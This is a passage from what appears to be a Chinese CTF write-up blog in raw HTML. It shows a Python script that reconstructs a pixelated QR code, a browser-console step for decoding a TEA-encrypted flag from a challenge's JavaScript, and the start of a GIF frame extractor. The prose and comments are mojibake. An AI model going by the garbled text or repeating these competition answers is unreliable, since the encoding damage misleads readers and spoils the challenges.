class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> PIL <span class=\"keyword\">import</span> Image</span><br><span class=\"line\"><span class=\"keyword\">import</span> math</span><br><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"><span class=\"comment\"># import scipy</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> matplotlib.pyplot <span class=\"keyword\">as</span> plt</span><br><span class=\"line\"></span><br><span class=\"line\">SIZE = <span class=\"number\">627</span></span><br><span class=\"line\">MSBLOCK = <span class=\"number\">23</span></span><br><span class=\"line\">QRBLOCK = <span class=\"number\">11</span></span><br><span class=\"line\">X, Y = <span class=\"number\">103</span>, <span class=\"number\">137</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">ImageToMatrix</span>(<span class=\"params\">filename</span>):</span><br><span class=\"line\">    <span class=\"comment\"># è¯»å–å›¾ç‰‡</span></span><br><span class=\"line\">    im = Image.<span class=\"built_in\">open</span>(filename)</span><br><span class=\"line\">    <span class=\"comment\"># æ˜¾ç¤ºå›¾ç‰‡</span></span><br><span class=\"line\"><span class=\"comment\">#     im.show()  </span></span><br><span class=\"line\">    width,height = im.size</span><br><span class=\"line\">    im = im.convert(<span class=\"string\">&quot;L&quot;</span>) </span><br><span class=\"line\">    data = im.getdata()</span><br><span class=\"line\">    data = np.matrix(data,dtype=<span class=\"string\">&#x27;float&#x27;</span>)/<span class=\"number\">255.0</span></span><br><span class=\"line\">    new_data = np.reshape(data,(width,height))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> new_data</span><br><span class=\"line\"><span class=\"comment\">#     new_im = Image.fromarray(new_data)</span></span><br><span class=\"line\"><span class=\"comment\">#     # æ˜¾ç¤ºå›¾ç‰‡</span></span><br><span class=\"line\"><span class=\"comment\">#     new_im.show()</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">MatrixToImage</span>(<span class=\"params\">data</span>):</span><br><span class=\"line\">    data = data*<span class=\"number\">255</span></span><br><span class=\"line\">    new_im = Image.fromarray(data.astype(np.uint8))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> new_im</span><br><span class=\"line\">    </span><br><span class=\"line\">pre_arr =  [[<span class=\"number\">0</span> <span class=\"keyword\">for</span> col <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(SIZE)] <span class=\"keyword\">for</span> row <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(SIZE)]</span><br><span class=\"line\">res_arr =  [[<span class=\"number\">1</span> <span class=\"keyword\">for</span> col <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(SIZE//QRBLOCK)] <span class=\"keyword\">for</span> row <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(SIZE//QRBLOCK)]</span><br><span class=\"line\">kimeta =  [[<span class=\"number\">0</span> <span class=\"keyword\">for</span> col <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(SIZE//QRBLOCK)] <span class=\"keyword\">for</span> row <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(SIZE//QRBLOCK)]<span class=\"comment\">#é’¦å®šäº†</span></span><br><span class=\"line\">EACH = <span class=\"built_in\">int</span>(math.ceil(MSBLOCK/QRBLOCK)) <span class=\"comment\">#EACH=3</span></span><br><span class=\"line\">filename = <span class=\"string\">&#x27;pixelated_qrcode.bmp&#x27;</span></span><br><span class=\"line\">data = ImageToMatrix(filename)</span><br><span class=\"line\">np.set_printoptions(threshold=<span class=\"number\">1145141919810</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,SIZE):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,SIZE):</span><br><span class=\"line\">            pre_arr[i][j]=data[i].tolist()[<span class=\"number\">0</span>][j]</span><br><span class=\"line\">            <span class=\"keyword\">if</span> i%QRBLOCK==<span class=\"number\">0</span> <span class=\"keyword\">and</span> j%QRBLOCK==<span class=\"number\">0</span>:</span><br><span class=\"line\">                res_arr[i//QRBLOCK][j//QRBLOCK]=<span class=\"built_in\">int</span>(data.tolist()[i][j])</span><br><span class=\"line\"><span class=\"comment\"># print(pre_arr)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span>  <span class=\"title function_\">check</span>(<span class=\"params\">i,j,now</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> i&lt;=<span class=\"number\">9</span> <span class=\"keyword\">or</span> i&gt;=<span class=\"number\">51</span> <span class=\"keyword\">or</span> j&lt;=<span class=\"number\">12</span> <span class=\"keyword\">or</span> j&gt;=<span class=\"number\">54</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> (pre_arr[i*QRBLOCK+<span class=\"number\">3</span>][j*QRBLOCK+<span class=\"number\">3</span>] == now):<span class=\"comment\">#éšä¾¿å†™çš„offset</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (kimeta[i][j] <span class=\"keyword\">or</span> vis[i][j]) <span class=\"keyword\">and</span> res_arr[i][j]!=now:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">getRange</span>(<span class=\"params\">i,j</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> i*QRBLOCK,j*QRBLOCK,(i+<span class=\"number\">1</span>)*QRBLOCK-<span class=\"number\">1</span>,(j+<span class=\"number\">1</span>)*QRBLOCK-<span class=\"number\">1</span> <span class=\"comment\">#x1,y1,x2,y2</span></span><br><span class=\"line\"></span><br><span class=\"line\">vis =  [[<span class=\"number\">0</span> <span class=\"keyword\">for</span> col <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(SIZE//QRBLOCK)] <span class=\"keyword\">for</span> row <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(SIZE//QRBLOCK)]</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">calcDelta</span>(<span class=\"params\">Mi,Mj,fillN,comp,LUR,LUC</span>):</span><br><span class=\"line\">    fn = fillN</span><br><span class=\"line\">    <span class=\"keyword\">for</span> xx <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(LUR,LUR+EACH) :</span><br><span class=\"line\">        <span class=\"keyword\">for</span> yy <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(LUC,LUC+EACH):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> check(xx,yy,fn&amp;<span class=\"number\">1</span>):</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"number\">114514</span></span><br><span class=\"line\">            fn = fn&gt;&gt;<span class=\"number\">1</span></span><br><span class=\"line\">    avr = <span class=\"number\">0</span></span><br><span class=\"line\">    qx1,qy1,qx2,qy2 = X+Mi*MSBLOCK,Y+Mj*MSBLOCK,X+(Mi+<span class=\"number\">1</span>)*MSBLOCK-<span class=\"number\">1</span>,Y+(Mj+<span class=\"number\">1</span>)*MSBLOCK-<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(LUR,LUR+EACH) :</span><br><span class=\"line\">        <span class=\"keyword\">for</span> y <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(LUC,LUC+EACH):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (fillN&amp;<span class=\"number\">1</span>):</span><br><span class=\"line\">                x1,y1,x2,y2 = getRange(x,y)</span><br><span class=\"line\">                inx1,iny1,inx2,iny2 = <span class=\"built_in\">max</span>(x1,qx1),<span class=\"built_in\">max</span>(y1,qy1),<span class=\"built_in\">min</span>(x2,qx2),<span class=\"built_in\">min</span>(y2,qy2)</span><br><span class=\"line\">                avr = avr + (iny2-iny1+<span class=\"number\">1</span>)*(inx2-inx1+<span class=\"number\">1</span>)</span><br><span class=\"line\">            fillN = fillN &gt;&gt; <span class=\"number\">1</span></span><br><span class=\"line\">    newres = avr/(MSBLOCK*MSBLOCK)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (newres &lt; comp-<span class=\"number\">0.1</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1919810</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">abs</span>(math.floor((avr/(MSBLOCK*MSBLOCK))*<span class=\"number\">255</span>)/<span class=\"number\">255</span>-comp)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">putRec</span>(<span class=\"params\">i,j</span>):<span class=\"comment\">#æ”¾ç½®è¯†åˆ«ç å—</span></span><br><span class=\"line\">    kimeta[i][j]=<span class=\"number\">1</span></span><br><span class=\"line\">    res_arr[i][j]=<span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">    kimeta[i][j+<span class=\"number\">1</span>]=<span class=\"number\">1</span></span><br><span class=\"line\">    res_arr[i][j+<span class=\"number\">1</span>]=<span class=\"number\">1</span></span><br><span class=\"line\">    kimeta[i][j-<span class=\"number\">1</span>]=<span class=\"number\">1</span></span><br><span class=\"line\">    res_arr[i][j-<span class=\"number\">1</span>]=<span class=\"number\">1</span></span><br><span class=\"line\">    kimeta[i+<span class=\"number\">1</span>][j]=<span class=\"number\">1</span></span><br><span class=\"line\">    res_arr[i+<span class=\"number\">1</span>][j]=<span class=\"number\">1</span></span><br><span class=\"line\">    kimeta[i-<span class=\"number\">1</span>][j]=<span class=\"number\">1</span></span><br><span class=\"line\">    res_arr[i-<span class=\"number\">1</span>][j]=<span class=\"number\">1</span></span><br><span class=\"line\">    kimeta[i+<span class=\"number\">1</span>][j+<span class=\"number\">1</span>]=<span class=\"number\">1</span></span><br><span class=\"line\">    res_arr[i+<span class=\"number\">1</span>][j+<span class=\"number\">1</span>]=<span class=\"number\">1</span></span><br><span class=\"line\">    kimeta[i-<span class=\"number\">1</span>][j-<span class=\"number\">1</span>]=<span class=\"number\">1</span></span><br><span class=\"line\">    res_arr[i-<span class=\"number\">1</span>][j-<span class=\"number\">1</span>]=<span class=\"number\">1</span></span><br><span class=\"line\">    kimeta[i+<span class=\"number\">1</span>][j-<span class=\"number\">1</span>]=<span class=\"number\">1</span></span><br><span class=\"line\">    res_arr[i+<span class=\"number\">1</span>][j-<span class=\"number\">1</span>]=<span class=\"number\">1</span></span><br><span class=\"line\">    kimeta[i-<span class=\"number\">1</span>][j+<span class=\"number\">1</span>]=<span class=\"number\">1</span></span><br><span class=\"line\">    res_arr[i-<span class=\"number\">1</span>][j+<span class=\"number\">1</span>]=<span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(i-<span class=\"number\">2</span>,i+<span class=\"number\">3</span>):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> y <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(j-<span class=\"number\">2</span>,j+<span class=\"number\">3</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"built_in\">abs</span>(x-i)==<span class=\"number\">2</span> <span class=\"keyword\">or</span> <span class=\"built_in\">abs</span>(y-j)==<span class=\"number\">2</span>:</span><br><span class=\"line\">                kimeta[x][y]=<span class=\"number\">1</span></span><br><span class=\"line\">                res_arr[x][y]=<span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">putRec(<span class=\"number\">28</span>,<span class=\"number\">28</span>)</span><br><span class=\"line\">putRec(<span class=\"number\">28</span>,<span class=\"number\">50</span>)</span><br><span class=\"line\">putRec(<span class=\"number\">50</span>,<span class=\"number\">50</span>)</span><br><span class=\"line\">putRec(<span class=\"number\">50</span>,<span class=\"number\">28</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">9</span>,<span class=\"number\">52</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">12</span>,<span class=\"number\">55</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> i==<span class=\"number\">9</span> <span class=\"keyword\">or</span> i==<span class=\"number\">51</span> <span class=\"keyword\">or</span> j==<span class=\"number\">12</span> <span class=\"keyword\">or</span> j==<span class=\"number\">54</span>:</span><br><span class=\"line\">            kimeta[i][j]=<span class=\"number\">1</span></span><br><span class=\"line\">            res_arr[i][j]=pre_arr[i*QRBLOCK+<span class=\"number\">3</span>][j*QRBLOCK+<span class=\"number\">3</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">new_arr =  [[<span class=\"number\">1</span> <span class=\"keyword\">for</span> col <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(SIZE)] <span class=\"keyword\">for</span> row <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(SIZE)]</span><br><span class=\"line\">fked =  [[<span class=\"number\">0</span> <span class=\"keyword\">for</span> col <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">20</span>)] <span class=\"keyword\">for</span> row <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">20</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\">cntt = <span class=\"number\">0</span></span><br><span class=\"line\">savecnt=<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">dfs</span>(<span class=\"params\">i,j</span>):<span class=\"comment\">#ä»é©¬èµ›å…‹å—çš„iè¡Œjåˆ—å¼€å§‹</span></span><br><span class=\"line\">    <span class=\"keyword\">global</span> cntt,savecnt</span><br><span class=\"line\">    cntt = cntt+<span class=\"number\">1</span></span><br><span class=\"line\">    LUR , LUC= (X+i*MSBLOCK)//QRBLOCK , (Y+j*MSBLOCK)//QRBLOCK</span><br><span class=\"line\">    <span class=\"comment\">#è½åœ¨å“ªä¸ªäºŒç»´ç æ–¹å—ä¸Š</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (cntt==<span class=\"number\">200000</span>):<span class=\"comment\">#ä¿å­˜ä¸­é€”ç»“æœ</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,SIZE):</span><br><span class=\"line\">            <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,SIZE):</span><br><span class=\"line\">                    new_arr[i][j]=res_arr[i//QRBLOCK][j//QRBLOCK]</span><br><span class=\"line\">        MatrixToImage(np.array(new_arr)).save(<span class=\"string\">&#x27;mid%s.bmp&#x27;</span>%savecnt)</span><br><span class=\"line\">        savecnt = savecnt + <span class=\"number\">1</span></span><br><span class=\"line\">        cntt = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> i&lt;<span class=\"number\">0</span> <span class=\"keyword\">or</span> i&gt;=<span class=\"number\">20</span> <span class=\"keyword\">or</span> j&lt;<span class=\"number\">0</span> <span class=\"keyword\">or</span> j&gt;=<span class=\"number\">20</span> <span class=\"keyword\">or</span> fked[i][j]:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">    fked[i][j]=<span class=\"number\">1</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    nowMin , nowSol = <span class=\"number\">114514191981.0</span> , (<span class=\"number\">1</span>&lt;&lt;(EACH*EACH))-<span class=\"number\">1</span></span><br><span class=\"line\">    tmpp =  [[<span class=\"number\">0</span> <span class=\"keyword\">for</span> col <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">3</span>)] <span class=\"keyword\">for</span> row <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">3</span>)]</span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(LUR,LUR+EACH) :</span><br><span class=\"line\">        <span class=\"keyword\">for</span> y <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(LUC,LUC+EACH):</span><br><span class=\"line\">            tmpp[x-LUR][y-LUC]=vis[x][y]</span><br><span class=\"line\">    <span class=\"keyword\">for</span> filN <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"number\">1</span>&lt;&lt;(EACH*EACH)):<span class=\"comment\">#æšä¸¾æ¯ä¸ªé©¬èµ›å…‹å—å½±å“åˆ°çš„3*3=9ä¸ªQRå—</span></span><br><span class=\"line\">        tmp = calcDelta(i, j, filN, pre_arr[X+i*MSBLOCK+<span class=\"number\">2</span>][Y+j*MSBLOCK+<span class=\"number\">2</span>],LUR,LUC)<span class=\"comment\">#åŒæ ·æ˜¯ä¹±å†™çš„offset+2</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> tmp &lt; <span class=\"number\">0.00000001</span>:</span><br><span class=\"line\">            nowSol = filN</span><br><span class=\"line\">            <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(LUR,LUR+EACH) :</span><br><span class=\"line\">                <span class=\"keyword\">for</span> y <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(LUC,LUC+EACH):</span><br><span class=\"line\">                    vis[x][y] = <span class=\"number\">1</span></span><br><span class=\"line\">                    res_arr[x][y]=nowSol&amp;<span class=\"number\">1</span></span><br><span class=\"line\">                    nowSol = nowSol&gt;&gt;<span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> ((i+<span class=\"number\">1</span>&lt;<span class=\"number\">20</span> <span class=\"keyword\">and</span> (<span class=\"keyword\">not</span> fked[i+<span class=\"number\">1</span>][j]) <span class=\"keyword\">and</span> dfs(i+<span class=\"number\">1</span>,j)) <span class=\"keyword\">or</span> (j+<span class=\"number\">1</span>&lt;<span class=\"number\">20</span> <span class=\"keyword\">and</span> (<span class=\"keyword\">not</span> fked[i][j+<span class=\"number\">1</span>]) <span class=\"keyword\">and</span> dfs(i,j+<span class=\"number\">1</span>)) <span class=\"keyword\">or</span> (i-<span class=\"number\">1</span>&gt;=<span class=\"number\">0</span> <span class=\"keyword\">and</span> (<span class=\"keyword\">not</span> fked[i-<span class=\"number\">1</span>][j]) <span class=\"keyword\">and</span> dfs(i-<span class=\"number\">1</span>,j)) <span class=\"keyword\">or</span> (j-<span class=\"number\">1</span>&gt;=<span class=\"number\">0</span> <span class=\"keyword\">and</span> (<span class=\"keyword\">not</span> fked[i][j-<span class=\"number\">1</span>]) <span class=\"keyword\">and</span> dfs(i,j-<span class=\"number\">1</span>))):</span><br><span class=\"line\">                fked[i][j]=<span class=\"number\">0</span></span><br><span class=\"line\">                <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(LUR,LUR+EACH) :</span><br><span class=\"line\">                    <span class=\"keyword\">for</span> y <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(LUC,LUC+EACH):</span><br><span class=\"line\">                        vis[x][y] = tmpp[x-LUR][y-LUC]</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">            </span><br><span class=\"line\">    fked[i][j]=<span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(LUR,LUR+EACH) :</span><br><span class=\"line\">        <span class=\"keyword\">for</span> y <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(LUC,LUC+EACH):</span><br><span class=\"line\">            vis[x][y] = tmpp[x-LUR][y-LUC]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#é¢„å…ˆæ‰«æï¼ŒæŠŠèƒ½ç¡®å®šçš„ã€æ²¡æœ‰å¤šè§£çš„å…ˆå¡«ä¸Š</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"number\">20</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"number\">20</span>):</span><br><span class=\"line\">        LUR , LUC= (X+i*MSBLOCK)//QRBLOCK , (Y+j*MSBLOCK)//QRBLOCK</span><br><span class=\"line\">        succnt = <span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> filN <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"number\">1</span>&lt;&lt;(EACH*EACH)):</span><br><span class=\"line\">                tmp = calcDelta(i, j, filN, pre_arr[X+i*MSBLOCK+<span class=\"number\">2</span>][Y+j*MSBLOCK+<span class=\"number\">2</span>],LUR,LUC)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> tmp &lt; <span class=\"number\">0.00000001</span>:</span><br><span class=\"line\">                    succnt = succnt + <span class=\"number\">1</span></span><br><span class=\"line\">                    nowSol = filN</span><br><span class=\"line\">        <span class=\"keyword\">if</span> succnt == <span class=\"number\">1</span>:</span><br><span class=\"line\">            <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(LUR,LUR+EACH) :</span><br><span class=\"line\">                <span class=\"keyword\">for</span> y <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(LUC,LUC+EACH):</span><br><span class=\"line\">                    kimeta[x][y] = <span class=\"number\">1</span></span><br><span class=\"line\">                    res_arr[x][y]=nowSol&amp;<span class=\"number\">1</span></span><br><span class=\"line\">                    nowSol = nowSol&gt;&gt;<span class=\"number\">1</span></span><br><span class=\"line\">dfs(<span class=\"number\">5</span>,<span class=\"number\">5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,SIZE):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,SIZE):</span><br><span class=\"line\">        new_arr[i][j]=res_arr[i//QRBLOCK][j//QRBLOCK]</span><br><span class=\"line\">MatrixToImage(np.array(new_arr)).save(<span class=\"string\">&#x27;resu.bmp&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>æœ€ç»ˆæ•ˆæœï¼š<img src=\"https://img2020.cnblogs.com/blog/1335480/202110/1335480-20211030160204036-1937509495.jpg\" alt=\"QRCode\" loading=\"lazy\"></p>\n<hr>\n<h2 id=\"minecRaft\"><a href=\"#minecRaft\" class=\"headerlink\" title=\"minecRaft\"></a>minecRaft</h2><p>webÃ— reverseâˆš<br>æ‰“å¼€ç½‘é¡µæŸ¥çœ‹jsï¼Œæ‰¾åˆ°flag.jsï¼Œåœ¨<a href=\"http://jsnice.org/\">jsnice.org</a>åæ··æ·†åè‡ªå·±æ‰‹åŠ¨å†æ›¿æ¢ä¸‹å‡ ä¸ªè¿·äººçœ¼çš„å¸¸é‡ï¼Œä¹‹åè¿›è¡Œä»£ç å®¡è®¡ï¼Œä¼šå‘ç°è¿™æ˜¯ä¸ªTEAåŠ å¯†ã€‚å¦‚ä½•å‘ç°æ˜¯TEAå‘¢ï¼Ÿæˆ‘æœäº†å¥½ä¹…ï¼Œåæ¥æœ‰äººå‘Šè¯‰æˆ‘åªéœ€è¦æœå¸¸é‡å°±è¡Œï¼ˆè¿˜éœ€è¦å­¦ä¹ ä¸€ä¸ªäººç”Ÿç»éªŒï¼‰ã€‚<br>æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²sï¼Œä½¿å¾—s.encrypt(â€œ{é‚£ä¸²æ•°å­—å¯†é’¥}â€)&#x3D;&#x3D;&#x3D; â€œ6fâ€¦â€¦0câ€<br>æŠŠå¯†æ–‡åˆ‡ç‰‡é¿å…è½¬æ¢åæ•°å­—è¿‡å¤§ï¼Œåœ¨é¢˜ç›®é¡µé¢ä¸‹<code>F12</code>ï¼Œè¿›å…¥Consoleé‡Œæ‰§è¡Œï¼š</p>\n<pre><code class=\"javascript\">window.btoa(LongToStr4(Base16ToLong(&#39;6fbde674&#39;))+LongToStr4(Base16ToLong(&#39;819a59bf&#39;))+LongToStr4(Base16ToLong(&#39;a1209256&#39;))+LongToStr4(Base16ToLong(&#39;5b4ca2a7&#39;))+LongToStr4(Base16ToLong(&#39;a11dc670&#39;))+LongToStr4(Base16ToLong(&#39;c678681d&#39;))+LongToStr4(Base16ToLong(&#39;af4afb67&#39;))+LongToStr4(Base16ToLong(&#39;04b82f0c&#39;)))\n</code></pre>\n<p>å¾—åˆ°å¯†æ–‡dOa9b79ZmoFWkiChp6JMW3DGHaEdaHjGZ&#x2F;tKrwwvuAQ&#x3D;<br>è°·æ­Œ<code>TEA decryption online</code>ï¼Œè¿›å…¥<a href=\"https://www.mefancy.com/obfuscation/encryption-generator.php\">https://www.mefancy.com/obfuscation/encryption-generator.php</a>æŠŠä¸Šé¢é‚£ä¸²æ•°å­—å¯†é’¥ï¼ˆ13â€¦ï¼‰è¿˜æœ‰å¯†æ–‡ä¸¢è¿›å»å°±å‡ºflagäº†ã€‚</p>\n<hr>\n<h2 id=\"pğŸ˜­q\"><a href=\"#pğŸ˜­q\" class=\"headerlink\" title=\"pğŸ˜­q\"></a>pğŸ˜­q</h2><p>è€å¤–å¤§å¥¥æµæ³ª.gif  æ—©çŸ¥é“ï¼Œè¿˜æ˜¯åŸé“.jpg<br>å…ˆæŠŠgifçš„å¸§æå–å‡ºæ¥æ–¹ä¾¿å¤„ç†ï¼š</p>\n<pre><code class=\"python\">import os\nimport sys\nfrom PIL import Image\n\ndef extractFrames(inGif, outFolder):\n    frame = Image.open(inGif)\n    nframes = 0\n    while frame:\n        frame.save(&#39;./dest/%s.png&#39; % (nframes))\n        nframes += 1\n        try:\n            frame.seek(nframes)\n        except EOFError:\n            break;\n    return True\n\nif __name__ == &#39;__main__&#39;:\n    image = 